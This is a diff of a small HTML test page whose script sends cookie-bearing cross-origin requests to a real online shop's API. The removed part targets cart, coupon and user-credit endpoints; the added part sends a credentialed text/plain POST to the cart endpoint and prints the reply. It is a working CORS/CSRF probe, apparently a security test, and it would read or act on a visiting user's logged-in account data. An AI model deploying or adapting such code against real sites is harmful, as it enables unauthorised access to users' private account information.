@@ -2,42 +2,30 @@
 <html>
 <body>
 
-<h3>External CORS Test</h3>
-<button onclick="run()">Run Test</button>
+<button onclick="test()">Run</button>
 
 <pre id="out"></pre>
 
 <script>
 
-const endpoints = [
-"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
-"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
-"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
-"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit"
-];
+function test(){
 
-function run(){
-
-document.getElementById("out").textContent="Running...\n\n";
-
-endpoints.forEach(url=>{
-
-fetch(url,{
+fetch("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",{
 method:"POST",
-credentials:"include"
+credentials:"include",
+headers:{
+"Content-Type":"text/plain"
+},
+body:"test"
 })
 
-.then(r=>r.text().then(t=>{
-document.getElementById("out").textContent +=
-url+"\nSTATUS: "+r.status+"\nBODY:\n"+t+"\n\n";
-}))
-
+.then(r=>r.text())
+.then(t=>{
+document.getElementById("out").textContent=t
+})
 .catch(e=>{
-document.getElementById("out").textContent +=
-url+"\nERROR: "+e+"\n\n";
-});
-
-});
+document.getElementById("out").textContent=e
+})
 
 }
 
